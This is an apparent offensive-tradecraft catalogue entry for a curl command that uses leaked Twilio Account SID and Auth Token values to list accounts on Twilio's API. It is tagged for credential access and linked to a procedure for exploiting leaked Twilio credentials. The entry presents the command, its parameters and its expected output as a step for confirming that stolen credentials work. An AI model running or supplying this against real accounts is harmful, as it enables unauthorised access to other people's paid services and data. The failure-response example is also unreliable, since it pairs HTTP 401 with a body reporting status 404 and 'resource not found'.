---
id: 09a29d64-ab05-4c3f-a594-99ebcbd0e281
name: curl-retrieve-twilio-accounts
type: command
executor: bash
data: >-
  curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u
  $_ACCOUNT_SID:$_AUTH_TOKEN
output: null
created_at: '2023-04-06T03:55:53.170030+00:00'
updated_at: '2023-04-06T03:55:53.179029+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - api
  - credential-access
verified: true
validated: true
---

# curl-retrieve-twilio-accounts

## Command

```bash
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u $_ACCOUNT_SID:$_AUTH_TOKEN
```

## Description

This command authenticates to the Twilio API using leaked Account SID and Auth Token to retrieve a list of accounts associated with the credentials. It validates the credentials and provides an overview of accessible Twilio resources, useful for confirming exploitation viability during credential access attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ACCOUNT_SID | The Twilio Account SID (username for Basic Auth) | Yes |
| $_AUTH_TOKEN | The Twilio Auth Token (password for Basic Auth) | Yes |
| -X GET | Specifies the HTTP method as GET | Built-in |
| 'https://api.twilio.com/2010-04-01/Accounts.json' | The API endpoint for listing accounts | Built-in |
| -u | Enables HTTP Basic Authentication | Built-in |

## Examples

### Basic Usage

```bash
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:your_auth_token_here
```

### Advanced Usage

```bash
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u $_ACCOUNT_SID:$_AUTH_TOKEN | jq '.'
```
(Add jq for JSON pretty-printing if installed.)

## Expected Output

Successful execution returns a JSON array of accounts:

```json
{
  "accounts": [
    {
      "sid": "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
      "status": "active",
      "auth_token": "xxxxxxxxxx",
      "date_created": "Wed, 08 Mar 2023 20:00:00 GMT",
      "date_updated": "Wed, 08 Mar 2023 20:00:00 GMT"
    }
  ],
  "first_page_uri": "/2010-04-01/Accounts.json?Page=0&PageSize=50",
  "next_page_uri": null,
  "page": 0,
  "page_size": 50,
  "previous_page_uri": null,
  "uri": "/2010-04-01/Accounts.json"
}
```

Failure (invalid credentials) returns HTTP 401 with: `{"code": 20003, "message": "The requested resource was not found", "more_info": "https://www.twilio.com/docs/errors/20003", "status": 404}`.

## Related

- [[procedures/Exploit-Leaked-Twilio-API-Credentials]]
- [[Unsecured Credentials|T1552]]
